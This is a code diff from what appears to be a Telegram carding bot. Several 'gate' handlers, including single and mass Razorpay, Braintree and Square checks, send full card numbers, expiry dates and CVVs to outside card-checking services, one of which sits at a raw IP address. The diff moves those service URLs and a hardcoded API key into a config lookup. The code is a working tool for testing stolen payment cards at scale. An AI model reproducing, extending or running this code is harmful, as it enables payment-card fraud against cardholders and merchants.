@@ -9548,7 +9548,9 @@ async def gate_rzp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         start_time = time_module.time()
-        api_url = f"https://rzpauto-production.up.railway.app/rzp?cc={card_str}&site={site}&amount={amount}"
+        from modules.gate_api_config import get_gate_cfg as _gcfg_rz
+        _rzp_base = _gcfg_rz("rzpauto_url", "https://rzpauto-production.up.railway.app/rzp")
+        api_url = f"{_rzp_base}?cc={card_str}&site={site}&amount={amount}"
 
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
@@ -9690,7 +9692,9 @@ async def gate_mrzp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             async def check_single_rzp(card):
                 card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                 try:
-                    api_url = f"https://rzpauto-production.up.railway.app/rzp?cc={card_str}&site={site}&amount={amount}"
+                    from modules.gate_api_config import get_gate_cfg as _gcfg_rz3
+                    _rzp3 = _gcfg_rz3("rzpauto_url", "https://rzpauto-production.up.railway.app/rzp")
+                    api_url = f"{_rzp3}?cc={card_str}&site={site}&amount={amount}"
                     async with aiohttp.ClientSession() as session:
                         async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                             if resp.status == 200:
@@ -9826,7 +9830,10 @@ async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
         start_time = time_module.time()
         
         # BarryX Braintree API
-        api_url = f"https://api.barryxapi.xyz/braintree_auth?key=BRY-KESNP-TUPWH-JFOT9&card={card_str}&proxy="
+        from modules.gate_api_config import get_gate_cfg as _gcfg
+        _bt_url = _gcfg("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+        _bt_key = _gcfg("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+        api_url = f"{_bt_url}?key={_bt_key}&card={card_str}&proxy="
         
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
@@ -9948,7 +9955,10 @@ async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, ca
                 async def check_single_card(card):
                     card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                     try:
-                        api_url = f"https://api.barryxapi.xyz/braintree_auth?key=BRY-KESNP-TUPWH-JFOT9&card={card_str}&proxy="
+                        from modules.gate_api_config import get_gate_cfg as _gcfg2
+                        _bt_url2 = _gcfg2("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+                        _bt_key2 = _gcfg2("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+                        api_url = f"{_bt_url2}?key={_bt_key2}&card={card_str}&proxy="
                         start_time = time_module.time()
                         
                         async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
@@ -15098,13 +15108,15 @@ except Exception:
     _old_square_auth_logic = None
 
 # ── Square API helper ─────────────────────────────────────────────────────
-_SQUARE_API = "http://138.128.240.15:8006/square"
+def _SQUARE_API():
+    from modules.gate_api_config import get_gate_cfg
+    return get_gate_cfg("square_api_url", "http://138.128.240.15:8006/square")
 
 async def _call_square_api(cc: str, mm: str, yy: str, cvv: str) -> dict:
     """Call the Square Auth API and return parsed JSON dict."""
     import aiohttp
     card_str = f"{cc}|{mm}|{yy}|{cvv}"
-    url = f"{_SQUARE_API}?cc={card_str}"
+    url = f"{_SQUARE_API()}?cc={card_str}"
     async with aiohttp.ClientSession() as session:
         async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
             data = await resp.json(content_type=None)
